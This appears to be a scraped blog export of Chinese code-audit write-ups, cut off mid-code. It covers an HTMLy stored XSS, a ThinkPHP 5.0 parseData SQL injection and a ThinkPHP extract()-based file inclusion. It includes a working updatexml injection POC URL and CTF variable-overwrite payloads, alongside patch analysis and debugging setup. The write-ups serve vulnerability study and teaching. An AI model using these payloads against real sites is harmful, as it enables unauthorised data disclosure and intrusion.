Improvements · danpros&#x2F;htmly (github.com) 将文件夹放入phpstudy的web目录下 C:\\phpstudy_pro\\WWW 根据README.md中的步骤，修改htmly的配置文件 在config文件夹中将example重命名为config.ini 修改config.ini，设置siteurl的地址 12; The URL of your blog.site.url = &quot;http://htmly:8088/\\/&quot; 在 config/users 的文件夹中，将example重命名为htmly.ini（填入自己像设置的用户名即可） 修改htmly.ini，填入密码 在phpstudy中创建项目 访问http://htmly:8088/install.php页面，进行安装 成功安装后跳转到该页面 访问 http://htmly:8088/login 进入到管理员页面 phpstorm动态调试参考往期文章，配置动态调试thinkphp5.0 文件包含漏洞分析-超详细保姆级 - Gryffinbit的思维殿堂 0x03 动态调试章节 0x03 漏洞分析XSS漏洞原理跨站脚本攻击XSS通过将恶意得Script代码注入到Web页面中，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。 XSS漏洞（全网最详细）-CSDN博客 漏洞函数在htmly.php中，对传入的数据进行了处理 1add_content($title, $tag, $url, $content, $user, $draft, $category, &#x27;post&#x27;, $description, null, $dateTime); 在对$content变量进行的定义 1$content = from($_REQUEST, &#x27;content&#x27;); 用户传入content数据，经过from函数进行处理并赋值给$content变量。跟进from函数。这个函数可以从数组中提取单个值或多个值（如果$name是数组），并且在提取过程中处理换行符和去除空白。 1234567891011function from($source, $name) &#123; $map = array(&quot;\\r\\n&quot; =&gt; &quot;\\n&quot;, &quot;\\r&quot; =&gt; &quot;\\n&quot;); if (is_array($name)) &#123; $data = array(); foreach ($name as $k) $data[$k] = isset($source[$k]) ? trim(strtr($source[$k], $map)) : null; return $data; &#125; return isset($source[$name]) ? trim(strtr($source[$name], $map)) : null; &#125; 这个from()函数的作用是从指定的$source数组（例如$_REQUEST）中提取指定键的值，并进行一些处理。以下是对代码的详细解释： $map = array(&quot;\\r\\n&quot; =&gt; &quot;\\n&quot;, &quot;\\r&quot; =&gt; &quot;\\n&quot;);: 这是一个映射数组，用于将Windows和Mac风格的换行符（\\r\\n和\\r）转换为Unix风格的换行符（\\n）。这有助于统一处理不同操作系统下的换行符，确保数据一致性。 if (is_array($name)): 如果$name是一个数组，函数将遍历这个数组，从$source中提取每个键的值，并进行处理。 $data = array();: 如果$name是数组，函数会创建一个空数组$data来存储结果。 foreach ($name as $k): 遍历$name数组中的每个键$k。 $data[$k] = isset($source[$k]) ? trim(strtr($source[$k], $map)) : null;: 对于每个键$k，检查它是否存在于$source数组中。 如果存在，使用strtr()函数将换行符替换成\\n，再用trim()去掉值的首尾空白字符，然后将结果存入$data[$k]。 如果键不存在，将结果设置为null。 return $data;: 如果$name是数组，返回处理后的结果数组$data。 return isset($source[$name]) ? trim(strtr($source[$name], $map)) : null;: 如果$name不是数组，则直接从$source中获取对应的值，处理后返回。 如果键不存在，返回null。 由于该函数对传入的数据没有进行严格过滤，所以导致了漏洞的存在。 0x04 攻击演示漏洞点：http://htmly:8088///add/content?type=post文章内容写入处存在xss点击xss的文章触发xss漏洞","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://gryffinbit.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://gryffinbit.top/tags/XSS/"}],"author":"Gryffinbit"},{"title":"thinkphp5.0 parseData sql 注入漏洞分析","slug":"thinkphp5-0-sql-注入漏洞分析","date":"2024-08-07T03:29:03.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2024/08/07/thinkphp5-0-sql-注入漏洞分析/","permalink":"https://gryffinbit.top/2024/08/07/thinkphp5-0-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"","text":"0X01 漏洞概况本次漏洞存在于 Builder 类的 parseData 方法中。由于程序没有对数据进行很好的过滤，将数据拼接进 SQL 语句，导致 SQL注入漏洞 的产生。漏洞影响版本： 5.0.13&lt;&#x3D;ThinkPHP&lt;&#x3D;5.0.15 、 5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.5 。 实验环境 composer版本1.8.5 1composer create-project --prefer-dist topthink/think=5.0.15 thinkphp5015 将 composer.json 文件的 require 字段设置成如下： 1234&quot;require&quot;: &#123; &quot;php&quot;: &quot;&gt;=5.4.0&quot;, &quot;topthink/framework&quot;: &quot;5.0.15&quot;&#125; 执行update 1composer update 可以直接用phpstudy带的composer 修改 application/index/controller/Index.php 文件 123456789101112&lt;?phpnamespace app\\index\\controller;class Index&#123; public function index() &#123; $username = request()-&gt;get(&#x27;username/a&#x27;); db(&#x27;users&#x27;)-&gt;insert([&#x27;username&#x27; =&gt; $username]); return &#x27;Update success&#x27;; &#125;&#125; 创建数据库 1234create table users( id int primary key auto_increment, username varchar(50) not null); 配置数据库 在 application/database.php 文件中配置数据库相关信息，并开启 application/config.php 中的 app_debug 和 app_trace 配置完成 0X02 漏洞复现POC1http://&lt;yoursite&gt;/public/index.php/index/index?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1 参数部分包含三个键值对： username[0]=inc：设置 username[0] 参数的值为 inc。 username[1]=updatexml(1,concat(0x7,user(),0x7e),1)：设置 username[1] 参数的值为 updatexml(1,concat(0x7,user(),0x7e),1)。 username[2]=1：设置 username[2] 参数的值为 1。 其中，username[1] 的值，是一个试图利用 updatexml 函数进行 SQL 注入的示例 1updatexml(1, concat(0x7, user(), 0x7e), 1) updatexml是 MySQL 中的一个函数，用于更新 XML 数据。在这里利用它来执行任意 SQL 查询。 concat(0x7, user(), 0x7e)：concat 函数用于连接字符串。0x7 和 0x7e 是十六进制表示的字符，分别是 BEL 和 ~（换成别的什么乱七八糟的也可以）。它们会与当前数据库用户的名字（通过 user() 函数获取）拼接在一起。 由于 updatexml 函数的设计，这种拼接的字符串会被插入到 XML 文档中，并返回错误消息，其中包含拼接的内容。这样，攻击者可以通过错误消息获取敏感信息，如当前数据库用户。 user()获取当前数据库用户的名字 version() 获取当前数据库版本 0X03 代码分析调用链 漏洞函数application/index/controller/Index.php 123456public function index()&#123; $username = request()-&gt;get(&#x27;username/a&#x27;); db(&#x27;users&#x27;)-&gt;insert([&#x27;username&#x27; =&gt; $username]); return &#x27;Update success&#x27;;&#125; request()-&gt;get(&#39;username/a&#39;)：从请求中获取 username 参数，并假设它是一个数组。 db(&#39;users&#39;)-&gt;insert([&#39;username&#39; =&gt; $username])：将获取到的 username 参数插入到 users 表中。 return &#39;Update success&#39;：返回一个简单的成功消息。 **跟进insert ** 1db(&#x27;users&#x27;)-&gt;insert([&#x27;username&#x27; =&gt; $username]); 进来后跟进生成sql语句，看\\think\\db\\Query::insert函数如何处理数据 跟进\\think\\db\\Builder::insert 数据会先经过\\think\\db\\Builder::parseData进行处理 跟进\\think\\db\\Builder::parseData 获取字段列表 123456$bind = $this-&gt;query-&gt;getFieldsBind($options[&#x27;table&#x27;]);if (&#x27;*&#x27; == $options[&#x27;field&#x27;]) &#123; $fields = array_keys($bind);&#125; else &#123; $fields = $options[&#x27;field&#x27;];&#125; getFieldsBind 获取 $options[&#39;table&#39;]表的字段绑定信息，并存储在 $bind 中。如果 $options[&#39;field&#39;] 等于 &#39;*&#39;，表示选择所有字段，则将 $bind 中的所有键（字段名）存储在 $fields 中。否则，将 $options[&#39;field&#39;] 的值存储在 $fields 中。 处理数据 result 初始化创建一个空数组用于存放结果数据 foreach 循环遍历传入的数据 data，用以处理键值对 如果键值对中的值val 是一个对象，并且存在toString 的方法，则调用该方法，将其转换为字符串。 检查键 key 是否包含”.”，且是否是fields字段列表中的。 如果不在，并且是在严格模式 ($options[&#39;strict&#39;]为 true) ，抛出异常。 如果值为空，则返回到结果数组中，置为NULL 如果不为空，则对 $val[0]进行判断，分三支为 ‘exp’、’inc’、’dec’【根据数组的第一个元素（表示操作类型）进行不同处理】 &#39;exp&#39;: 表达式，直接使用值。 当 $val 是一个数组且 $val[0] 为 &#39;exp&#39; 时，直接将 $val[1] 赋值给 $result[$item]。&#39;exp&#39; 通常表示一个原生的数据库表达式，因此不需要进一步处理。 例如： $val = [&#39;exp&#39;, &#39;NOW()&#39;]，则 $result[$item] 将被赋值为 &#39;NOW()&#39;，表示在 SQL 中使用当前时间。 &#39;inc&#39;: 递增操作，解析键并构造递增表达式。 当 $val 是一个数组且 $val[0] 为 &#39;inc&#39; 时，表示一个递增操作。$val[1] 是要递增的字段名，$val[2] 是递增的值。 例如：如果 $val = [&#39;inc&#39;, &#39;updatexml(0,concat(0x7,version(),0x7e),1)&#39;, 1]，并且 parseKey(&#39;updatexml(0,concat(0x7,version(),0x7e),1)&#39;) 返回 &#39;updatexml(0,concat(0x7,version(),0x7e),1)&#39;，则 $result[$item] 将被赋值为 &#39;updatexml(0,concat(0x7,version(),0x7e),1) + 1&#39; &#39;dec&#39;: 递减操作，解析键并构造递减表达式。 跟进 \\think\\db\\Builder::parseKey 对 $val 没有进行任何过滤处理，怎么进去的，怎么出来的。并且直接拼接 $val[2] 1234protected function parseKey($key, $options = [])&#123; return $key;&#125; 所以从parseData 方法处理后，出来的数据是 updatexml(0,concat(0x7,version(),0x7e),1) + 1 **回到\\think\\db\\Builder::insert**，向下跟进 生成一个完整的sql语句 1INSERT INTO `users` (`username`) VALUES (updatexml(0,concat(0x7,version(),0x7e),1)+1) 0X04 修复方案 修复漏洞的原理在于避免直接将用户输入的$val[1]值拼接到 SQL 语句中，而是使用安全的方式来构建 SQL 语句。 修复前： 123case &#x27;inc&#x27;: $result[$item] = $this-&gt;parseKey($val[1]) . &#x27;+&#x27; . floatval($val[2]); break; 在这段代码中，$val[1] 是用户输入的值，并通过 $this-&gt;parseKey 方法进行处理后，直接拼接到 $result[$item] 中。这种直接拼接方式很容易受到 SQL 注入攻击的影响。 修复后： 1$result[$item] = $item . &#x27;+&#x27; . floatval($val[2]); **使用 $item 代替 parseKey($val[1])**： $item 是通过 $this-&gt;parseKey($key, $options) 方法解析后的安全字段名。（$iterm的值为username） 这样可以确保 $item 是一个安全的字段名，避免直接使用用户输入的值。 将 floatval($val[2]) 与 $item 拼接： floatval($val[2]) 将用户输入的值转换为浮点数，以确保它是一个有效的数值，从而避免了字符串或其他类型的注入。 所以最终修复后的结果👇","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://gryffinbit.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"thinkphp","slug":"thinkphp","permalink":"https://gryffinbit.top/tags/thinkphp/"}],"author":"Gryffinbit"},{"title":"thinkphp5.0 文件包含漏洞分析-超详细保姆级","slug":"thinkphp5-0文件包含漏洞分析","date":"2024-08-07T03:28:36.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2024/08/07/thinkphp5-0文件包含漏洞分析/","permalink":"https://gryffinbit.top/2024/08/07/thinkphp5-0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"","text":"0X01 漏洞概况在于 ThinkPHP 模板引擎中，在加载模版解析变量时存在变量覆盖问题，而且程序没有对数据进行很好的过滤，最终导致文件包含漏洞 的产生。漏洞影响版本： 5.0.0&lt;&#x3D;ThinkPHP5&lt;&#x3D;5.0.18 、5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.10。 实验环境ThinkPHP-Vuln&#x2F;ThinkPHP5&#x2F;ThinkPHP5漏洞分析之文件包含7.md at master · Mochazz&#x2F;ThinkPHP-Vuln (github.com) 版本：thinkphp5.0.0~5.0.18 皆可 5.0.12版本的安装： 下载git源码：Releases · top-think&#x2F;think (github.com) 将源码放在phpstudy的www目录下 php版本大于5.4 composer安装 composer版本1.8.5 更换composer镜像源 1composer config -g repo.packagist composer https://mirrors.cloud.tencent.com/composer/ composer安装 12cd thinkphp5.0.12composer install 5.0.18 版本的安装： phpstudy 新建一个网站 用phpstudy 里的composer，通过以下命令获取测试环境代码： 1composer create-project --prefer-dist topthink/think=5.0.18 tpdemo 将 composer.json 文件的 require 字段设置成如下 1234&quot;require&quot;: &#123; &quot;php&quot;: &quot;&gt;=5.6.0&quot;, &quot;topthink/framework&quot;: &quot;5.0.18&quot;&#125;, 在 tpdemo 目录下执行 1composer update 0X02 PHP变量覆盖漏洞原理介绍自定义的参数值替换原有变量值的情况称为变量覆盖漏洞。经常导致变量覆盖漏洞场景有： 开启了全局变量注册 $$ 使用不当 extract() 函数使用不当 parse_str() 函数使用不当 import_request_variables() 使用不当等。 全局变量注册register_globals 在 PHP5.3 之前，默认开启；PHP5.3 默认关闭，PHP5.6 及 5.7 已经被移除. 由于本次漏洞分析，基于php5.4 以上版本，所以该方法不展开讲解 $$ 动态变量覆盖在PHP中，$$被称为“可变变量”。可变变量的概念是将一个变量的值作为另一个变量的名字。 假设你有一个变量 $a，并且你希望动态地创建或访问一个以 $a 的值为名字的变量。这时就可以用到 $$。 123456&lt;?php$a = &quot;hello&quot;;$$a = &quot;world&quot;;echo $hello; // 输出 &quot;world&quot;?&gt; 在上面的例子中： 首先，$a 被赋值为字符串 &quot;hello&quot;。 接着，$$a 就等同于 $hello，因为 $a 的值是 &quot;hello&quot;。 然后，我们给 $hello 赋值为 &quot;world&quot;。 最后，输出 $hello 的值，结果是 &quot;world&quot;。 通过这种方式，你可以动态地创建和访问变量。这种用法在需要根据变量名的值来生成新变量名的情况下非常有用，例如在处理动态数据或配置时。 实操一道题，来获取flag 1234567891011121314&lt;?phpforeach (array(&#x27;_POST&#x27;,&#x27;_GET&#x27;) as $_request) &#123; foreach ($$_request as $_key=&gt;$_value) &#123; $$_key = $_value; &#125;&#125;$id = isset($id) ? $id : 2;if ($id == 1) &#123; include(&#x27;./flag.php&#x27;); // 确保文件名正确 die();&#125;?&gt; $_key=&gt;$_value 是一个键值对，=&gt; 符号在PHP中用于关联数组中的键和值的分隔，左侧是键，右侧是值。 外层 foreach 迭代，第一次 $_request 的值是 &#39;_POST&#39;，在第二次迭代中，$_request 的值是 &#39;_GET&#39;。 内层 foreach 迭代，会遍历 $_POST 数组的所有键值对，然后遍历 $_GET 数组的键值对。并且动态创建变量。 假设 $_POST 包含以下数据： 1234$_POST = array( &quot;name&quot; =&gt; &quot;John&quot;, &quot;age&quot; =&gt; 30); 并且 $_GET 包含以下数据： 1234$_GET = array( &quot;city&quot; =&gt; &quot;New York&quot;, &quot;country&quot; =&gt; &quot;USA&quot;); 执行这段代码后，将会动态创建以下变量： 1234$name = &quot;John&quot;;$age = 30;$city = &quot;New York&quot;;$country = &quot;USA&quot;; 接下来是检查id。如果变量 $id 已设置（即已经定义并且不是 null），那么 $id 保持原值。如果变量 $id 未设置（即未定义或是 null），那么 $id 被赋值为 2。 if ($id == 1) 检查变量 $id 是否等于 1。如果条件为真，执行包含文件和终止脚本的操作。 include 语句：include(&#39;./flag.php&#39;) 在包含文件 flag.php 的内容。如果文件路径正确且文件存在，其内容将被执行。（在当前目录下） die() 函数：die() 终止脚本的执行。这样在包含文件后，不会继续执行后续代码。 分析代码可知，如果我们想要得到flag。直接 get/post 传参 id=1 即可，当执行 $$_key = $_value; 时，$_key=&quot;id&quot;，$$_key 等价于 $id，就终结果也就是 $id = 1，定义了 id 参数，并赋值为 1，也就导致了包含flag文件 extract() 函数使用不当这种类型的变量覆盖，就是此次分析的thinkphp5.0 文件包含漏洞中，涉及到的漏洞原理 extract() 函数从数组中将变量导入到当前的变量表。该函数使用数组键名作为变量名，使用数组键值作为变量值。 123456&lt;?php$a = array(&#x27;nickname&#x27; =&gt; &#x27;1ndex&#x27;);extract($a);echo $nickname;?&gt;//运行结果为输出 1ndex extract(array[,flag][,prefix])三个参数： array一个关联数组(必需)。此函数会将键名当作变量名，值作为变量的值。 对每个键／值对都会在当前的符号表中建立变量，并受到 flags 和 prefix 参数的影响。必须使用关联数组，数字索引的数组将不会产生结果，除非用了 EXTR_PREFIX_ALL 或者 EXTR_PREFIX_INVALID。 flags对待非法／数字和冲突的键名的方法将根据取出标记 flags 参数决定。可以是以下值之一： EXTR_OVERWRITE如果有冲突，覆盖已有的变量。(默认) EXTR_SKIP如果有冲突，不覆盖已有的变量。 EXTR_PREFIX_SAME如果有冲突，在变量名前加上前缀 prefix。 EXTR_PREFIX_ALL给所有变量名加上前缀 prefix。 EXTR_PREFIX_INVALID仅在非法／数字的变量名前加上前缀 prefix。 EXTR_IF_EXISTS仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。 举个例子，以下情况非常有用：定义一些有效变量，然后从 $_REQUEST 中仅导入这些已定义的变量。 EXTR_PREFIX_IF_EXISTS仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。 EXTR_REFS将变量作为引用提取。这有力地表明了导入的变量仍然引用了 array 参数的值。可以单独使用这个标志或者在 flags 中用 OR 与其它任何标志结合使用。 prefix注意 prefix 仅在 flags 的值是 EXTR_PREFIX_SAME，EXTR_PREFIX_ALL，EXTR_PREFIX_INVALID 或 EXTR_PREFIX_IF_EXISTS 时需要。 如果附加了前缀后的结果不是合法的变量名，将不会导入到符号表中。前缀和数组键名之间会自动加上一个下划线。 flags 参数默认为 EXTR_OVERWRITE，即如果有冲突，覆盖已有的变量 获取flag，题目1： 12345678910&lt;?phpextract($_GET); if(isset($mypwd))&#123; if($mypwd==$pwd) &#123; include(&quot;./flag&quot;); &#125;&#125;?&gt; extract($_GET); 默认为EXTR_OVERWRITE，冲突时覆盖已有变量。通过GET进行传参。代码的逻辑是，如果设置了$mypwd，且 $mypwd&#x3D;&#x3D;$pwd 时，则可以获取flag。所以$_get部分获取到的是一个键值对。例如：mypwd&#x3D;&gt;1, pwd &#x3D;&gt;1 . extract($GET); 的结果是$mypwd&#x3D;1, $pwd&#x3D;1. . 即GET传入 pwd=1&amp;mypwd=1. 题目2： 1234567891011121314151617&lt;?php if ($_SERVER[&quot;REQUEST_METHOD&quot;] == “POST”) &#123; ?&gt; &lt;?php extract($_POST); if ($pass == $thepassword_123) &#123; ?&gt; &lt;div class=”alert alert-success”&gt; &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt; &lt;/div&gt; &lt;?php &#125; ?&gt;&lt;?php &#125; ?&gt; 需要构造POST传参，为满足$pass &#x3D;&#x3D; $thepassword_123。可以传：pass=1&amp;thepassword_123=1. （只要使使$pass == $thepassword_123即可得到flag） parse_str() 函数使用不当parse_str() 函数把字符串解析成多个变量。其作用就是解析字符串并注册成变量，在注册变量之前不会验证当前变量是否存在，所以直接覆盖掉已有变量。当 magic_quotes_gpc = On，那么在 parse_str() 解析之前，变量会被 addslashes() 转换(也就是会被转义，加反斜线)。 parse_str(string[,array])，两个参数分别为： string输入的字符串。如果 str 是 URL 传递入的查询字符串(query string)，则将它解析为变量并设置到当前作用域(如果提供了 array 则会设置到该数组里)注意，php &gt;= 7.2，如果不设置该参数，该函数将失效 array一个数组，如果设置该参数， 变量将会以数组元素的形式存入到这个数组，作为替代 12345678&lt;?php $str = &quot;first=value&amp;arr[]=foo+bar&amp;arr[]=baz&quot;; parse_str($str, $output); echo $output[&#x27;first&#x27;]; // value echo $output[&#x27;arr&#x27;][0]; // foo bar echo $output[&#x27;arr&#x27;][1]; // baz?&gt; 题目： 12345678910111213141516&lt;? phperror_reporting(0);if (empty($_GET[&#x27;id&#x27;])) &#123; show_source(__FILE__); die();&#125; else &#123; include(‘. / flag.php’); $a = “https: //www.cnblogs.com/wjrblogs/”; $id = $_GET[&#x27;id&#x27;]; @parse_str($id); if ($a[0] != ‘QNKCDZO’ &amp;&amp; md5($a[0]) == md5(‘QNKCDZO’)) &#123; echo $flag; &#125; else &#123; exit(‘其实很简单其实并不难！’); &#125;&#125; ?&gt; 首先检查 URL 中是否没有传递 id 参数，或者传递的 id 参数是一个空值。如果是的话，显示文件的源码。 @ 符号用于抑制任何可能的错误或警告消息。@parse_str($id); 会对传入的内容进行处理，将字符串解析为变量。 PHP Hash比较存在缺陷 ，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。而这里的 md5(‘QNKCDZO’) 的结果是 0e830400451993494058024219903391 。所以payload为 ?id&#x3D;a[0]&#x3D;s878926199a 。 import_request_variables() 使用不当版本要求：PHP 4 &gt;&#x3D; 4.1.0, PHP 5 &lt; 5.4.0 1bool import_request_variables ( string $types [, string $prefix ] ) string指定导入哪些变量为全局变量，可以用字母 G、P 和 C 分别表示导入 GET、POST 和 Cookie 中的变量。这些字母不区分大小写，所以你可以使用 g、p 和 c 的任何组合。POST 包含了通过 POST 方法上传的文件信息。注意这些字母的顺序，当使用 gp 时，POST 变量将使用相同的名字覆盖 GET 变量。任何 GPC 以外的字母都将被忽略 prefix$prefix 变量名的前缀，置于所有被导入到全局作用域的变量之前。所以如果你有个名为 userid 的 GET 变量，同时提供了 pref_ 作为前缀，那么你将获得一个名为 $pref_userid 的全局变量。虽然 prefix 参数是可选的，但如果不指定前缀，或者指定一个空字符串作为前缀，你将获得一个 E_NOTICE 级别的错误。 1234567&lt;?php// 此处将导入 GET 和 POST 变量// 使用 runoob_ 作为前缀import_request_variables(&quot;gP&quot;, &quot;runoob_&quot;); echo $runoob_foo;?&gt; 修复 在php.ini文件中设置register_globals&#x3D;OFF 使用原始变量数组，如$_POST,$_GET等数组变量进行操作 不使用foreach语句来遍历$_GET变量，而改用[(index)]来指定 验证变量是否存在，注册变量前先判断变量是否存在 题目： 12345678&lt;? php$auth = &#x27;0&#x27;;import_request_variables(&#x27;G&#x27;);if ($auth == 1) &#123; echo &quot;登陆成功&quot;;&#125; else &#123; echo &quot;登陆失败&quot;;&#125; ?&gt; import_request_variables(&#39;G&#39;);: 这是一个将 GET 请求参数导入到全局命名空间中的函数。&#39;G&#39; 表示只导入 GET 请求参数。 这意味着，如果 URL 中包含 auth 参数，例如 example.com/script.php?auth=1，该参数的值将覆盖现有的 $auth 变量。 所以直接传参?auth=1 0X03 动态调试phpstudy在phpstudy中，勾选xdebug的PHP扩展选项 xdebug helper 插件在浏览器应用商店里安装xdebug helper插件，并设置IDE key phpstorm设置 配置 端口为 thinkphp 的web 端口 在phpstorm中打开小虫子监听，在浏览器中把插件，选成绿色虫子状态，并刷新页面。 刷新页面后，会跳转到phpstorm页面，并显示如下页面。 调试成功 找到漏洞函数&#x2F;漏洞点，调出它的调用链，然后进一步分析 在漏洞点处打断点 xdebug helper，浏览器页面刷新，跳转到phpstorm 进入动态调试 按绿色小箭头，让程序正常运行，会在断点处停下，这样就可以找到调用链了。然后分析下去。 调试过程中总是中断在调试的过程中，总是中断并且报500的错误，原因是 apache 默认的连接时间过短，调试时超过了默认的连接时间。 解决方案：修改phpstudy的apache配置，并重启apache。 12FcgidIOTimeout 3000 FcgidConnectTimeout 3000 配置文件里不能有中文 0X04 补丁分析0X05 漏洞分析调用链 漏洞点漏洞成因是由于**flags 参数默认为 EXTR_OVERWRITE，即如果有冲突，覆盖已有的变量** extract(array[,flag][,prefix])： array一个关联数组(必需)。此函数会将键名当作变量名，值作为变量的值。 对每个键／值对都会在当前的符号表中建立变量，并受到 flags 和 prefix 参数的影响。必须使用关联数组，数字索引的数组将不会产生结果，除非用了 EXTR_PREFIX_ALL 或者 EXTR_PREFIX_INVALID。 flags对待非法／数字和冲突的键名的方法将根据取出标记 flags 参数决定。可以是以下值之一： EXTR_OVERWRITE如果有冲突，覆盖已有的变量。(默认) 安全的做法是确定register_globals&#x3D;OFF后，在调用extract()时使用EXTR_SKIP保证已有变量不会被覆盖。 12345678910public function read($cacheFile, $vars = [])&#123; $this-&gt;cacheFile = $cacheFile; if (!empty($vars) &amp;&amp; is_array($vars)) &#123; // 模板阵列变量分解成为独立变量 extract($vars, EXTR_OVERWRITE); &#125; //载入模版缓存文件 include $this-&gt;cacheFile;&#125; 这里调用了 extract($vars, EXTR_OVERWRITE);采用的是覆盖已有变量的方式。可以通过在$vars里面传数据的方式，来覆盖cacheFile这个变量。 index文件修改需要在源文件的基础上，修改 application/index/controller/Index.php 为视图模板。并且增加一个文件 application/index/view/index/index.html（内容可为空，只需有这个文件即可） 输出替换 - ThinkPHP官方手册 1234567891011&lt;?phpnamespace app\\index\\controller;use think\\Controller;class Index extends Controller&#123; public function index() &#123; $this-&gt;assign(request()-&gt;get()); return $this-&gt;fetch(); // 当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html &#125;&#125; 漏洞跟进 断点打在 $this-&gt;assign(request()-&gt;get()); 然后点 step into ，一步步跟进，看参数都经过了哪些处理。 从 application/index/controller/Index.php 传参点跟进。 12345public function index() &#123; $this-&gt;assign(request()-&gt;get()); return $this-&gt;fetch(); // 当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html &#125; $this-&gt;assign(request()-&gt;get()); request()-&gt;get()：获取当前 HTTP 请求的所有 GET 参数，并返回一个数组。 $this-&gt;assign()：通常用于将数据分配到视图。在 ThinkPHP 中，assign 方法将数据分配到模板变量，使它们可以在视图模板中使用。 return $this-&gt;fetch(); $this-&gt;fetch()：渲染并返回视图。根据注释，它会默认加载当前模块的视图目录下，当前控制器和当前操作对应的模板文件。 跟进fetch函数 1234protected function fetch($template = &#x27;&#x27;, $vars = [], $replace = [], $config = [])&#123; return $this-&gt;view-&gt;fetch($template, $vars, $replace, $config);&#125; fetch 需要传入 template 模板信息和模板变量（即当前模块&#x2F;默认视图目录&#x2F;当前控制器（小写）&#x2F;当前操作（小写）.html application/index/view/index/index.html） 12345678910111213141516public function fetch($template = &#x27;&#x27;, $vars = [], $replace = [], $config = [], $renderContent = false)&#123; ...... // 渲染输出 try &#123; $method = $renderContent ? &#x27;display&#x27; : &#x27;fetch&#x27;; // 允许用户自定义模板的字符串替换 $replace = array_merge($this-&gt;replace, $replace, (array) $this-&gt;engine-&gt;config(&#x27;tpl_replace_string&#x27;)); $this-&gt;engine-&gt;config(&#x27;tpl_replace_string&#x27;, $replace); $this-&gt;engine-&gt;$method($template, $vars, $config); &#125; catch (\\Exception $e) &#123; ob_end_clean(); throw $e; &#125; .....&#125; 1$method = $renderContent ? &#x27;display&#x27; : &#x27;fetch&#x27;; 根据 $renderContent 的值选择调用 display 还是 fetch 方法。display 用于直接输出内容，而 fetch 用于返回渲染后的内容。 1$this-&gt;engine-&gt;$method($template, $vars, $config); 调用模板引擎的 fetch 或 display 方法进行渲染。 从调用链里，看到是调用的fetch方法。跟进引擎中的think\\view\\driver\\Think-&gt;fetch()。 123456789101112131415public function fetch($template, $data = [], $config = [])&#123; if (&#x27;&#x27; == pathinfo($template, PATHINFO_EXTENSION)) &#123; // 获取模板文件名 $template = $this-&gt;parseTemplate($template); &#125; // 模板不存在 抛出异常 if (!is_file($template)) &#123; throw new TemplateNotFoundException(&#x27;template not exists:&#x27; . $template, $template); &#125; // 记录视图信息 App::$debug &amp;&amp; Log::record(&#x27;[ VIEW ] &#x27; . $template . &#x27; [ &#x27; . var_export(array_keys($data), true) . &#x27; ]&#x27;, &#x27;info&#x27;); $this-&gt;template-&gt;fetch($template, $data, $config);&#125; 123456789101112131415161718192021222324252627282930313233343536373839public function fetch($template, $vars = [], $config = [])&#123; if ($vars) &#123; $this-&gt;data = $vars; &#125; if ($config) &#123; $this-&gt;config($config); &#125; if (!empty($this-&gt;config[&#x27;cache_id&#x27;]) &amp;&amp; $this-&gt;config[&#x27;display_cache&#x27;]) &#123; // 读取渲染缓存 $cacheContent = Cache::get($this-&gt;config[&#x27;cache_id&#x27;]); if (false !== $cacheContent) &#123; echo $cacheContent; return; &#125; &#125; $template = $this-&gt;parseTemplateFile($template); if ($template) &#123; $cacheFile = $this-&gt;config[&#x27;cache_path&#x27;] . $this-&gt;config[&#x27;cache_prefix&#x27;] . md5($this-&gt;config[&#x27;layout_name&#x27;] . $template) . &#x27;.&#x27; . ltrim($this-&gt;config[&#x27;cache_suffix&#x27;], &#x27;.&#x27;); if (!$this-&gt;checkCache($cacheFile)) &#123; // 缓存无效 重新模板编译 $content = file_get_contents($template); $this-&gt;compiler($content, $cacheFile); &#125; // 页面缓存 ob_start(); ob_implicit_flush(0); // 读取编译存储 $this-&gt;storage-&gt;read($cacheFile, $this-&gt;data); // 获取并清空缓存 $content = ob_get_clean(); if (!empty($this-&gt;config[&#x27;cache_id&#x27;]) &amp;&amp; $this-&gt;config[&#x27;display_cache&#x27;]) &#123; // 缓存页面输出 Cache::set($this-&gt;config[&#x27;cache_id&#x27;], $content, $this-&gt;config[&#x27;cache_time&#x27;]); &#125; echo $content; &#125;&#125; 12345678910public function read($cacheFile, $vars = [])&#123; if (!empty($vars) &amp;&amp; is_array($vars)) &#123; // 模板阵列变量分解成为独立变量 extract($vars, EXTR_OVERWRITE); &#125; //载入模版缓存文件 include $cacheFile;&#125; 调用request函数的get对象，来进行传参。传入的数据，送进assign进行处理。 assign 方法通常用于 MVC 框架中的控制器（如 ThinkPHP），将数据分配到视图中，使其可以在模板中使用数据。 123456789&gt;public function assign($name, $value = &#x27;&#x27;)&gt;&#123; if (is_array($name)) &#123; $this-&gt;data = array_merge($this-&gt;data, $name); &#125; else &#123; $this-&gt;data[$name] = $value; &#125; return $this;&gt;&#125; **$name**： 可以是一个字符串或一个数组。如果是字符串，则表示要分配到视图中的单个变量名；如果是数组，则表示要分配到视图中的多个变量名和值的键值对。 **$value**： 这是可选参数，默认为空字符串。仅当 $name 是字符串时才使用，表示要分配到视图中的变量的值。 如果name是数组，执行 array_merge 操作，将 $name 中的所有键值对合并到 $this-&gt;data 中。如果 $name 不是数组（即是字符串），则将 $value 赋值给 $this-&gt;data 中对应的键 $name。 例如： 1234$this-&gt;data = [&#x27;a&#x27; =&gt; 1, &#x27;b&#x27; 